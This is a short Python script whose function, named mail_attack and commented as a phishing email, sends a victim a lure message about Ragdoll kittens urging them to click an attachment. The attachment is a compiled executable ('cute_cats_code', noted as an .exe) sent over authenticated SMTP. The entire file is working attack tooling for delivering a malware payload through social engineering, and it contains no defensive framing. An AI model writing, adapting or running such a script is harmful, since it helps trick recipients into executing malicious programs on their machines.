import smtplib
import ssl
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

from config import Config as config


# phishing email
def mail_attack(victim_mail):
    email = config.MAIL_USERNAME
    password = config.MAIL_PASSWORD

    subject = "Cute cats"
    body = "Hi! \n Did you know Ragdoll kittens are the most beautiful breeds of cats in the world? \n click the " \
           "attachment to view... "

    # Create a multipart message and set headers
    message = MIMEMultipart()
    message["From"] = email
    message["To"] = victim_mail
    message["Subject"] = subject
    message["Bcc"] = victim_mail  # Recommended for mass emails

    # Add body to email
    message.attach(MIMEText(body, "plain"))

    filename = "dist/cute_cats_code"  # .Exe In same directory as script
    # filename = "dummy.png"  # Dummy tester image In same directory as script

    # Open PDF file in binary mode
    with open(filename, "rb") as attachment:
        # Add file as application/octet-stream
        # Email client can usually download this automatically as attachment
        part = MIMEBase("application", "octet-stream")
        part.set_payload(attachment.read())

    # Encode file in ASCII characters to send by email    
    encoders.encode_base64(part)

    # Add header as key/value pair to attachment part
    part.add_header(
        "Content-Disposition",
        f"attachment; filename= {filename}",
    )

    # Add attachment to message and convert message to string
    message.attach(part)
    text = message.as_string()

    # Log in to server using secure context and send email
    context = ssl.create_default_context()
    with smtplib.SMTP_SSL(config.MAIL_SERVER, config.MAIL_PORT, context=context) as mail:
        print("Authenticating...")
        mail.login(email, password)
        mail.sendmail(email, victim_mail, text)

    print('Done')

    # mail.quit()
